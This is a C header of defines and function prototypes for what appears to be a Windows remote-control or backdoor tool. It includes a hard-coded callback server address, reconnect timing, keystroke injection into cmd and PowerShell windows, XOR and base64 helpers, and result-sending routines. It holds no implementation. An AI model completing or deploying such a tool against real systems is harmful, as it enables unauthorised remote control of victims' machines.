#define BUFLEN 4096
#define BUFSEND 4096
#define PORT 80
#define SERVERIP "192.168.133.7"
#define REALDELAY 150
#define BYTE 0x55
#define RECONNECT 1
#define RECTIME 30000

typedef struct {
	size_t len;
	unsigned char *data;
} b64result;

HWND searchWindow(char *);
HWND getHandle(HWND);
void quickStartFocus(HWND);
void sendChars(HWND, char *);
void deleteChars(HWND);
void sendEscape(HWND);
void writeFile(HWND, char *, char *, int);
void sendCmdtoCmd(HWND, char *);
void sendCmdtoPowershell(HWND, char *);
void sendResult(int);
void endFile(int);
void endConn(int);
void okMsg(int);
char *concatenate(char *, char *);
unsigned char *x0r(char *, int);
b64result *b64decode(char *);
b64result *b64encode(char *, int);
